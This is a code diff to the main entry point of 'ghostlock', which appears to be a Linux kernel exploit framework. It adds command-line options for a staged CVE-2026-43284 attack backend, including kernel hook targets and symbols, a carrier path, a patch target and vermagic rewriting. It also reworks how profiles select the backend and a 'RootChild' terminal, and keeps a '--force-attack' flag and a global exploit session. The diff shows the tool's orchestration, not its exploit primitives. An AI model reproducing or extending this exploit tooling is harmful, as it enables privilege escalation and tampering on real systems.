@@ -10,7 +10,13 @@
  * ghostlock::backend::victim, ghostlock::race and ghostlock::session::stages.
  */
 
-#include "common.h"
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include "kernelsnitch/utils.h"
+
+#include <cstdint>
 
 #include "profile/entry.h"
 #include "backend/cve_2026_43284/diagnostic.hpp"
@@ -33,15 +39,6 @@ using namespace ghostlock;
 
 int main(int argc, char **argv) {
     try {
-        profile::kernel_offsets decoded = {};
-        std::array<char, 256> release_buf{};
-        binary_profile::component_ids ids{
-            static_cast<uint16_t>(pipeline::TerminalKind::RootChild),
-            static_cast<uint16_t>(pipeline::BackendKind::Cve2026_43499),
-            0,
-            0,
-        };
-
         support::cli::Options options{};
         support::cli::ParseError parse_error;
         if (!support::cli::parse_arguments(argc, argv, options, parse_error)) {
@@ -68,12 +65,24 @@ int main(int argc, char **argv) {
                 case support::cli::ParseError::DevTargetRequiresRun:
                     pr_error("--allow-dev-target requires --run-cve-2026-43284\n");
                     break;
+                case support::cli::ParseError::Cve43284OptionRequiresRun:
+                    pr_error("--cve43284-* options require --run-cve-2026-43284\n");
+                    break;
+                case support::cli::ParseError::BadHookGuard:
+                    pr_error("--cve43284-hook-guard must be reject|skip\n");
+                    break;
                 default:
                     pr_error("usage: %s [--ghostlock-app-call | --load-prebuilt-profile <bin> |"
                              " --probe-cve-2026-43284 <ko-path> |"
                              " --run-cve-2026-43284 <ko-path> <target-file>"
                              " [--stage=plan|write|trigger|full]"
-                             " [--allow-dev-target]]"
+                             " [--allow-dev-target]"
+                             " [--cve43284-hook-target <path>]"
+                             " [--cve43284-hook-symbol <mangled>]"
+                             " [--cve43284-hook-guard reject|skip]"
+                             " [--cve43284-carrier <path>]"
+                             " [--cve43284-patch1-target <path>]"
+                             " [--cve43284-allow-vermagic-rewrite]]"
                              " [--dump-kernel-log <dir>] [--force-attack]"
                              " [--enable-status-record]\n",
                              argv[0]);
@@ -89,12 +98,34 @@ int main(int argc, char **argv) {
             /* Explicit staged execution: never reachable from a profile/wire
              * selection, so backend_available(Cve2026_43284) stays false and
              * the default pipeline never runs it. */
+            using backend::cve_2026_43284::stage_runner::StagedRunOptions;
             const auto stage = static_cast<
                     backend::cve_2026_43284::stage_runner::Stage>(
                     static_cast<std::uint8_t>(options.run_stage));
-            return backend::cve_2026_43284::stage_runner::run_stage_cli(
-                    options.run_module_path, options.run_target_path, stage,
-                    options.allow_dev_target);
+            StagedRunOptions staged{};
+            staged.module_path = options.run_module_path;
+            staged.target_path = options.run_target_path;
+            staged.stage = stage;
+            staged.allow_dev_target = options.allow_dev_target;
+            staged.allow_vermagic_rewrite = options.allow_vermagic_rewrite;
+            if (options.run_hook_target != nullptr) {
+                staged.hook_target = options.run_hook_target;
+            }
+            if (options.run_hook_symbol != nullptr) {
+                staged.hook_symbol = options.run_hook_symbol;
+            }
+            if (options.run_carrier_path != nullptr) {
+                staged.carrier_path = options.run_carrier_path;
+            }
+            if (options.run_patch1_target != nullptr) {
+                staged.patch1_target = options.run_patch1_target;
+            }
+            if (options.run_hook_guard ==
+                support::cli::Cve43284HookGuard::Reject) {
+                staged.hook_guard =
+                        backend::cve_2026_43284::steps::HookGuardPolicy::Reject;
+            }
+            return backend::cve_2026_43284::stage_runner::run_stage_cli(staged);
         }
         const bool app_call = options.mode == support::cli::Mode::AppCall;
         const bool force_attack = options.force_attack;
@@ -103,39 +134,48 @@ int main(int argc, char **argv) {
         const char *dump_dir = options.dump_kernel_log;
         support::run_state::configure(status_record);
 
-        int32_t loaded;
+        profile_entry::ReadResult read;
         if (prebuilt_path != nullptr) {
-            loaded = profile_entry::read_glk1_file(prebuilt_path, &decoded, release_buf.data(), release_buf.size(), &ids);
+            read = profile_entry::read_glk1_file(prebuilt_path);
         } else if (app_call) {
-            loaded = status_record
-                         ? profile_entry::read_glk1_frame_stdin(
-                               &decoded, release_buf.data(), release_buf.size(), &ids)
-                         : profile_entry::read_glk1_stdin(
-                               &decoded, release_buf.data(), release_buf.size(), &ids);
+            read = status_record ? profile_entry::read_glk1_frame_stdin()
+                                 : profile_entry::read_glk1_stdin();
         } else {
             pr_error("no entrypoint: pass --ghostlock-app-call or --load-prebuilt-profile <bin>\n");
             return 1;
         }
-        if (loaded != 0) {
+        if (read.error != 0) {
             pr_error("cannot load profile\n");
             throw FatalError{};
         }
+        /* The wire selection: v2 carries numeric ids, GLKv3 carries component
+         * tokens. Resolving the tokens is composition-root work because the
+         * component vocabulary lives in the catalogue, not in the transport. */
+        profile::Document &decoded = read.document;
+        if (!decoded.backend_token.empty()) {
+            contract::BackendKind backend_kind{};
+            if (!pipeline::backend_from_token(decoded.backend_token, backend_kind)) {
+                pr_error("cannot load profile\n");
+                throw FatalError{};
+            }
+            decoded.backend = static_cast<uint16_t>(backend_kind);
+        }
+        if (!decoded.terminal_token.empty()) {
+            contract::TerminalKind terminal_kind{};
+            if (!pipeline::terminal_from_token(decoded.terminal_token, terminal_kind)) {
+                pr_error("cannot load profile\n");
+                throw FatalError{};
+            }
+            decoded.terminal = static_cast<uint16_t>(terminal_kind);
+        }
 
         auto &session = session::g_exploit_session;
-        /* The component selection comes from the wire; the route field is the
-         * fallback when a middleware id was not carried. */
-        if (ids.middleware == 0) {
-            ids.middleware = static_cast<uint16_t>(decoded.route_kind());
-        }
-        /* Route is backend-internal (ADR-0004 R12): fold the wire selector into
-         * the decoded profile the backend switches on. */
-        if (decoded.route == profile::kRouteAuto && ids.middleware != 0) {
-            decoded.route = static_cast<uint8_t>(ids.middleware);
-        }
-        const pipeline::ComponentSelection selection{
-            .backend = static_cast<pipeline::BackendKind>(ids.backend),
-            .steps = static_cast<pipeline::StepSetKind>(ids.steps),
-            .terminal = static_cast<pipeline::TerminalKind>(ids.terminal),
+        /* Route is backend-internal (ADR-0004 R12): the backend reads it from
+         * the bound profile; the selection carries only backend/steps/terminal. */
+        const contract::ComponentSelection selection{
+            .backend = static_cast<contract::BackendKind>(decoded.backend),
+            .steps = pipeline::wire_stepset(decoded),
+            .terminal = static_cast<contract::TerminalKind>(decoded.terminal),
         };
         /* B5-1 (channel B): only the cve_2026_43284 backend MAY be followed by
          * the optional runtime session-secret frame on the same stdin, after
@@ -146,7 +186,7 @@ int main(int argc, char **argv) {
          * exit; they never reach a profile, a file, argv or a log. */
         backend::cve_2026_43284::ScopedIpsecSaParams session_secrets;
         if (app_call && status_record &&
-            selection.backend == pipeline::BackendKind::Cve2026_43284) {
+            selection.backend == contract::BackendKind::Cve2026_43284) {
             const backend::cve_2026_43284::SessionFrameStatus frame_status =
                     backend::cve_2026_43284::read_session_secret_frame(
                             STDIN_FILENO, &session_secrets.value);
@@ -156,14 +196,14 @@ int main(int argc, char **argv) {
                 throw FatalError{};
             }
         }
-        if (!pipeline::selection_supported(selection)) {
+        if (!contract::selection_supported(selection)) {
             /* Known-but-unavailable ids land here (unknown ids were rejected at
              * decode time), named for diagnosis. */
             const std::string terminal(pipeline::terminal_name(selection.terminal));
             const std::string backend(pipeline::backend_name(selection.backend));
             const std::string steps(pipeline::stepset_name(selection.steps));
             const std::string route(pipeline::middleware_name(
-                static_cast<pipeline::MiddlewareKind>(ids.middleware)));
+                static_cast<pipeline::MiddlewareKind>(decoded.middleware)));
             pr_error("unsupported component selection: backend=%s steps=%s terminal=%s route=%s\n",
                      backend.c_str(), steps.c_str(), terminal.c_str(), route.c_str());
             throw FatalError{};
